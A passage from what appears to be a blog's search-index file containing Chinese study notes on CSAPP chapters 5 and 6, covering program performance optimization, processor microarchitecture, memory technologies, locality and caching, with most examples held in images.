<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105200717087.png" alt="image-20231105200717087"></p>
<p>栗子：转换大小写代码。</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105201410149.png" alt="image-20231105201410149"></p>
<p><img src="/2023/11/05/CSAPP-5-textbook/ZL\source_posts\CSAPP-5-textbook\image-20231105201440210.png" alt="image-20231105201440210"></p>
<h2 id="5-5-减少过程调用"><a href="#5-5-减少过程调用" class="headerlink" title="5.5 减少过程调用"></a>5.5 减少过程调用</h2><p>过程调用会带来开销，并且妨碍大多数形式的程序优化。</p>
<p>combine3 减少函数调用，直接访问数组元素。</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105201924617.png" alt="image-20231105201924617"></p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105201957273.png" alt="image-20231105201957273"></p>
<p><strong>CPE</strong>并没有明显的优化，显然内存中其他的操作形成了瓶颈，限制性能超过调用<code>get_vec_element()</code>。</p>
<h2 id="5-6-消除不必要的内存引用"><a href="#5-6-消除不必要的内存引用" class="headerlink" title="5.6 消除不必要的内存引用"></a>5.6 消除不必要的内存引用</h2><p>combine3 的代码将 合并 运算计算的值累积在指针dest指定的位置，通过检查编译出来的为内循环产生的汇编代码，可以看出这个属性：</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105202727643.png" alt="image-20231105202727643"></p>
<p>每次迭代时，<strong>累积变量的数值都要从内存中读出再写入到内存</strong>，这样的读写很浪费，因为每次迭代开始时从dest读出的值就是上次迭代最后写入的值。</p>
<p>如果能够消除这种不必要的读写，引入一个临时变量acc 再循环中用来累积计算出来的值，只有再循环完成后才将结果存放在dest。因此可以将每次迭代的内存操作由两次读和一次写，减少到只需要一次读。</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105203437140.png" alt="image-20231105203437140"></p>
<p>由此可以得到 combine4：</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105203714725.png" alt="image-20231105203714725"></p>
<p>性能有了显著的提升：</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105203749364.png" alt="image-20231105203749364"></p>
<p>编译器不能判断函数会在说明情况下被调用，以及程序员的本意可能是什么，取而代之的是，编译在编译combine3 的时候，<strong>保守的方法是不断读和写内存</strong>，即便这样做的效率不够高。</p>
<h2 id="5-7-理解现代处理器"><a href="#5-7-理解现代处理器" class="headerlink" title="5.7 理解现代处理器"></a>5.7 理解现代处理器</h2><p>以上的优化都不涉及目标机器的任何特性，只是简单的降低了过程调用的开销，想要进一步提高性能，必须考虑利用处理器微体系结构的优化。</p>
<ul>
<li>看上去是一次执行一条指令，实际上是同是对多条指令求值—–指令级并行</li>
</ul>
<h3 id="5-7-1-整体操作"><a href="#5-7-1-整体操作" class="headerlink" title="5.7.1 整体操作"></a>5.7.1 整体操作</h3><ul>
<li><strong>超标量 superscalar：</strong>它可以在每个时钟周期执行多个操作</li>
<li><strong>乱序-out-of-order：</strong>执行的顺序不一定要与它们在机器级程序中的顺序一致</li>
</ul>
<p>整个设计有两个部分，一个是<code>icu （instruction control unit）指令控制单元</code>和<code>eu（execution unit）执行单元</code>，前者负<strong>责从内存中读出</strong>指令序列，并且根据这些指令序列生成一组针对程序数据的基本操作；后者<strong>负责执行</strong>这些操作。</p>
<p>乱序处理器需要更大、更复杂的硬件，但是它们能更好的达到更高的指令级并行度。</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231105210458295.png" alt="image-20231105210458295"></p>
<ul>
<li>现代处理器采用了一种<strong>分支预测</strong>的技术，处理器会猜测是否会选择分支，同时还预测分支的目标地址。然后使用<strong>投机执行</strong>的技术，处理器会开始取出位于它预测的分支会跳到的地方的指令，并对指令进行译码，甚至在它确定分支预测是否正确之前就开始执行这些操作。</li>
<li>如果<strong>分支预测错误</strong>，会将状态重新设置到分支点的状态，并开始取出和执行另一个方向上的指令。<strong>标记为取值控制的块</strong>包括分支预测，以完成确定取哪些指令的任务。</li>
<li><strong>指令译码</strong>逻辑接收实际的程序指令，并将它们转换为一组基本操作有时称为微操作，每个这样的操作都完成莫格简单的计算任务，例如两个数相加，从内存中读取数据等。</li>
<li>加载单元和存储单元通过<strong>数据高速缓存 data cache</strong>来访问内存</li>
<li>任何对程序寄存器的更新都只会在<strong>指令退役时</strong>才会发生</li>
</ul>
<h3 id="5-7-2-功能单元的性能"><a href="#5-7-2-功能单元的性能" class="headerlink" title="5.7.2 功能单元的性能"></a>5.7.2 功能单元的性能</h3><p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107143922899.png" alt="image-20231107143922899"></p>
<ul>
<li>加法乘法的发射时间都为1，很短的发射时间都是通过流水线完成的</li>
<li>除法器它的发射时间等于它的延迟，不是完全流水线化的</li>
</ul>
<h3 id="5-7-3-处理器操作的抽象模型"><a href="#5-7-3-处理器操作的抽象模型" class="headerlink" title="5.7.3 处理器操作的抽象模型"></a>5.7.3 处理器操作的抽象模型</h3><p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107145454286.png" alt="image-20231107145454286"></p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107145813142.png" alt="image-20231107145813142"></p>
<p>关键路径</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107150336835.png" alt="image-20231107150336835"></p>
<h2 id="5-8-循环展开"><a href="#5-8-循环展开" class="headerlink" title="5.8  循环展开"></a>5.8  循环展开</h2><ul>
<li>循环展开是一种程序 变换，通过增加每次迭代计算的元素的数量，减少循环的迭代次数。</li>
</ul>
<h2 id="5-9-提高并行性"><a href="#5-9-提高并行性" class="headerlink" title="5.9 提高并行性"></a>5.9 提高并行性</h2><ul>
<li>程序的性能是受到运算单元的延迟限制的，需要利用硬件提高性能—并行</li>
</ul>
<h3 id="5-9-1-多个累积变量"><a href="#5-9-1-多个累积变量" class="headerlink" title="5.9.1 多个累积变量"></a>5.9.1 多个累积变量</h3><ul>
<li>如下所示，将乘积分成了奇数和偶数分，最后再将二者合并。</li>
</ul>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107151825829.png" alt="image-20231107151825829"></p>
<ul>
<li>改进性能：</li>
</ul>
<p><img src="/2023/11/05/CSAPP-5-textbook/ZL\source_posts\CSAPP-5-textbook\image-20231107152106204.png" alt="image-20231107152106204"></p>
<ul>
<li>两条关键路径</li>
</ul>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107152317378.png" alt="image-20231107152317378"></p>
<ul>
<li><strong>这种分开计算的情况特殊要当心数据溢出！！！</strong></li>
</ul>
<h3 id="5-9-2-重新结合变换"><a href="#5-9-2-重新结合变换" class="headerlink" title="5.9.2 重新结合变换"></a>5.9.2 重新结合变换</h3><ul>
<li>栗子：</li>
</ul>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107152650411.png" alt="image-20231107152650411"></p>
<ul>
<li>关键路径上只包含<strong>n&#x2F;2个操作</strong></li>
<li><img src="/2023/11/05/CSAPP-5-textbook/image-20231107153008690.png" alt="image-20231107153008690" style="zoom: 80%;"></li>
</ul>
<h2 id="5-10-优化合并代码的结果小结"><a href="#5-10-优化合并代码的结果小结" class="headerlink" title="5.10 优化合并代码的结果小结"></a>5.10 优化合并代码的结果小结</h2><p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107153251198.png" alt="image-20231107153251198"></p>
<h2 id="5-11-一些限制因素"><a href="#5-11-一些限制因素" class="headerlink" title="5.11 一些限制因素"></a>5.11 一些限制因素</h2><p><strong>关键路径指明了执行该程序所需时间的一个基本的下界</strong></p>
<h3 id="5-11-1-寄存器溢出"><a href="#5-11-1-寄存器溢出" class="headerlink" title="5.11.1 寄存器溢出"></a>5.11.1 寄存器溢出</h3><p>循环并行性受到计算的能力限制。如果并行度超过了可用的寄存器数量，那么编译器会诉诸<strong>溢出</strong>，将某些临时值放入到内存中。</p>
<h3 id="5-11-2-分支预测和预测错误处罚"><a href="#5-11-2-分支预测和预测错误处罚" class="headerlink" title="5.11.2 分支预测和预测错误处罚"></a>5.11.2 分支预测和预测错误处罚</h3><ul>
<li>不要过分关心可预测的分支—-错误的分支预测影响可能非常大，但是这并不意味着所有的程序分支都会减缓程序的执行。</li>
<li>书写适合用条件传送实现的代码：<strong>对于本质上无法预测的情况，如果编译器能够产生使用条件数据传送而不是使用条件控制转移的代码，可以极大的提高程序性能</strong>。下面栗子：第一个数命令式风格，第二个是功能式风格。<code>因为条件分支在程序执行的过程中可能会预测错误，可以改为不用条件控制，直接使用条件数据代码效率能提升很多。</code><ul>
<li><img src="/2023/11/05/CSAPP-5-textbook/image-20231107154900514.png" alt="image-20231107154900514"></li>
<li><img src="/2023/11/05/CSAPP-5-textbook/image-20231107155040288.png" alt="image-20231107155040288"></li>
</ul>
</li>
</ul>
<h2 id="5-12-理解内存性能"><a href="#5-12-理解内存性能" class="headerlink" title="5.12 理解内存性能"></a>5.12 理解内存性能</h2><p>现代处理器会包含一个或多个高速缓存<code>cache</code>存储器，提供对少量数据的快速访问。</p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107162525802.png" alt="image-20231107162525802"></p>
<p><img src="/2023/11/05/CSAPP-5-textbook/image-20231107162903435.png" alt="image-20231107162903435"></p>
<ul>
<li>对于寄存器操作，在指令被译码成操作的时候，处理器就可确定哪些指令去影响其他指令</li>
<li>但是对于内存操作，只有计算加载和存储的地址被计算出来后，处理器才能确定哪些指令会影响其他的哪些。</li>
</ul>
<h2 id="5-13-性能提高技术"><a href="#5-13-性能提高技术" class="headerlink" title="5.13 性能提高技术"></a>5.13 性能提高技术</h2><p>优化程序性能的基本策略：</p>
<ul>
<li>高级设计：选择适当的算法和数据结构</li>
<li>基本编码原则：避免限制优化的因素<ul>
<li>消除连续的函数调用，将计算移到循环外</li>
<li>消除不必要的内存引用，引入中间变量来保存中间的结果，只有在最后的值被计算出来时才将结果存放在数组或全局变量中</li>
</ul>
</li>
<li>低级优化：结构化代码利用硬件功能<ul>
<li>展开循环，降低开销</li>
<li>通过使用多个变量和重新结合技术，找到方法提高指令级并行</li>
<li>功能性风格重写条件操作，使用条件数据，避免分支预测错误。</li>
</ul>
</li>
</ul>
<h2 id="5-14-确认和消除性能瓶颈"><a href="#5-14-确认和消除性能瓶颈" class="headerlink" title="5.14 确认和消除性能瓶颈"></a>5.14 确认和消除性能瓶颈</h2><h3 id="5-14-1-程序剖析"><a href="#5-14-1-程序剖析" class="headerlink" title="5.14.1 程序剖析"></a>5.14.1 程序剖析</h3><ul>
<li>unix提供了一个剖析程序GPROF，产生两种形式的信息：确定每个函数花费了多少CPU的时间；其次，计算每个函数被调用的次数，以执行调用的函数来分类。</li>
<li><img src="/2023/11/05/CSAPP-5-textbook/image-20231107164637542.png" alt="image-20231107164637542"></li>
<li>报告解析</li>
<li><img src="/2023/11/05/CSAPP-5-textbook/image-20231107164959460.png" alt="image-20231107164959460"></li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-6-textbook</title>
    <url>/2023/11/08/CSAPP-6-textbook/</url>
    <content><![CDATA[<h1 id="第六章-存储器层次结构"><a href="#第六章-存储器层次结构" class="headerlink" title="第六章 存储器层次结构"></a>第六章 存储器层次结构</h1><p>存储器系统是一个具有不同容量、成本和访问时间的存储设备的层次结构。</p>
<h2 id="6-1-存储技术"><a href="#6-1-存储技术" class="headerlink" title="6.1 存储技术"></a>6.1 存储技术</h2><h3 id="6-1-1-随机访问存储器"><a href="#6-1-1-随机访问存储器" class="headerlink" title="6.1.1 随机访问存储器"></a>6.1.1 随机访问存储器</h3><p><code>RAM random-access-memory</code>随机访问存储器：静态存储器<code>SRAM</code>和动态存储器<code>DRAM</code>。SRAM更快，用来做高速缓存存储器；DRAM用来作为主存以及图形系统的帧缓冲区。</p>
<ul>
<li>SRAM ： 双稳态特性 六晶体管电路实现。双稳态特性：只要有电就能永远保持它的值，在干扰消除时，电路就会恢复到稳定值<ul>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231108150832768.png" alt="image-20231108150832768"></li>
</ul>
</li>
<li>DRAM：有一个电容和一个访问晶体管组成，对干扰非常敏感，当电容的电压被扰乱之后就永远不会恢复了</li>
</ul>
<p><img src="/2023/11/08/CSAPP-6-textbook/image-20231108151207731.png" alt="image-20231108151207731"></p>
<ul>
<li>传统DRAM：<ul>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231108151526344.png" alt="image-20231108151526344"></li>
<li><code>访问：</code></li>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231108151827824.png" alt="image-20231108151827824"></li>
</ul>
</li>
<li>内存模块：DRAM芯片封装在内存模块中</li>
<li>增强的DRAM：<ul>
<li>FRM DRAM：快页模式</li>
<li>EDO DRAM：拓展数据输出</li>
<li>SDRAM：同步</li>
<li>DDR DRAM：双倍数据速率同步</li>
<li>VRAM：视频</li>
</ul>
</li>
<li>非易失性存储器：如果断电DRAM和SRAM 都会丢失他们的信息。非易失性存储器即使在关电后也能保存他们的信息被称为<code>ROM read-only-memory</code>只读存储器。<ul>
<li>PROM：可编程，只能被编程一次</li>
<li>EPROM：可擦写可编程 多次</li>
<li>flash memory ：SSD固态硬盘</li>
<li>存储在ROM设备中的程序通常被称为固件。</li>
</ul>
</li>
<li>访问主存：数据流通过总线的电子电路在CPU和DRAM主存之间来来回回</li>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231108155122376.png" alt="image-20231108155122376"></li>
</ul>
<h2 id="6-1-2-磁盘存储"><a href="#6-1-2-磁盘存储" class="headerlink" title="6.1.2 磁盘存储"></a>6.1.2 磁盘存储</h2><ul>
<li>连接I&#x2F;O设备 ：都是通过I&#x2F;O总线连接：<ul>
<li>USB 通用串行总线</li>
<li>图形卡</li>
<li>SATA</li>
</ul>
</li>
<li>CPU 使用一种称为内存映射I&#x2F;O的技术来向I&#x2F;O设备发射命令。</li>
<li>设备可以自己执行读或者写总线事物而不需要CPU干涉的过程，称为直接内存访问<code>DMA</code>，在DMA传送完成，磁盘扇区内容被安全的存储在主存中之后，磁盘控制器会给CPU发送一个中断信号来通知CPU</li>
</ul>
<h3 id="6-1-3-固态硬盘"><a href="#6-1-3-固态硬盘" class="headerlink" title="6.1.3 固态硬盘"></a>6.1.3 固态硬盘</h3><p><img src="/2023/11/08/CSAPP-6-textbook/image-20231108160830919.png" alt="image-20231108160830919"></p>
<p>固态硬盘的结构：</p>
<p><img src="/2023/11/08/CSAPP-6-textbook/image-20231108160903040.png" alt="image-20231108160903040"></p>
<ul>
<li>读SSD比写要快，这是由于底层闪存基本属性决定的。数据是以页为单位读写的</li>
</ul>
<p><img src="/2023/11/08/CSAPP-6-textbook/image-20231108161202737.png" alt="image-20231108161202737"></p>
<h2 id="6-2-局部性"><a href="#6-2-局部性" class="headerlink" title="6.2 局部性"></a>6.2 局部性</h2><p><strong>局部性原理：</strong>倾向于引用邻近于其他引用过的数据项，或者最近引用过的数据项本身。</p>
<ul>
<li>时间局部性：在一个具有良好时间局部性的程序中，被<strong>引用过一次的内存位置</strong>很可能在不远的将来<strong>被多次引用</strong></li>
<li>空间局部性：在一个具有良好空间局部性的程序中，如果一次内存位置被引用了一次，那么程序很可能会在不远的将来<strong>引用附近的一个内存位置</strong>。</li>
</ul>
<h3 id="6-2-1-对程序数据引用的局部性"><a href="#6-2-1-对程序数据引用的局部性" class="headerlink" title="6.2.1 对程序数据引用的局部性"></a>6.2.1 对程序数据引用的局部性</h3><p><strong>栗子：</strong></p>
<p><img src="/2023/11/08/CSAPP-6-textbook/image-20231112160439738.png" alt="image-20231112160439738"></p>
<p>一般称如上为步长为1的顺序引用模式。</p>
<p>对于多维数组程序来说，步长是一个很重要的问题。</p>
<ul>
<li>按照行优先的遍历顺序，具备良好的空间局部性<ul>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231112160932410.png" alt="image-20231112160932410"></li>
</ul>
</li>
<li>按照列顺序遍历，空间局部性很差，因为<strong>多维数组在内存中是按照行顺序来存放的</strong><ul>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231112161058482.png" alt="image-20231112161058482"></li>
</ul>
</li>
</ul>
<p><strong>小结：</strong></p>
<p><img src="/2023/11/08/CSAPP-6-textbook/image-20231112161426438.png" alt="image-20231112161426438"></p>
<h2 id="6-3-存储器层次结构"><a href="#6-3-存储器层次结构" class="headerlink" title="6.3 存储器层次结构"></a>6.3 存储器层次结构</h2><p>典型的存储器层次结构：</p>
<p><img src="/2023/11/08/CSAPP-6-textbook/image-20231112174421006.png" alt="image-20231112174421006"></p>
<h3 id="6-3-1-存储器层次结构中的缓存"><a href="#6-3-1-存储器层次结构中的缓存" class="headerlink" title="6.3.1 存储器层次结构中的缓存"></a>6.3.1 存储器层次结构中的缓存</h3><p><code>cache</code>高速缓存，使用缓存的过程称为缓存</p>
<ul>
<li><code>k</code>作为<code>k+1</code>层的缓存</li>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231112175156684.png" alt="image-20231112175156684"></li>
<li>数据总是以块大小为传送单元在第k层和k+1层之间来回复制</li>
<li>缓存命中：<ul>
<li><img src="/2023/11/08/CSAPP-6-textbook/image-20231112175751647.png" alt="image-20231112175751647"></li>
</ul>
</li>
<li>缓存不命中：<ul>
<li>第k层中没有缓存数据对象d，就要从k+1层缓存中取出</li>
</ul>
</li>
</ul>
<p><strong>总结：</strong></p>
<p><img src="/2023/11/08/CSAPP-6-textbook/image-20231112180926107.png" alt="image-20231112180926107"></p>
<h2 id="6-4-高速缓存存储器"><a href="#6-4-高速缓存存储器" class="headerlink" title="6.4 高速缓存存储器"></a>6.4 高速缓存存储器</h2>]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
</search>
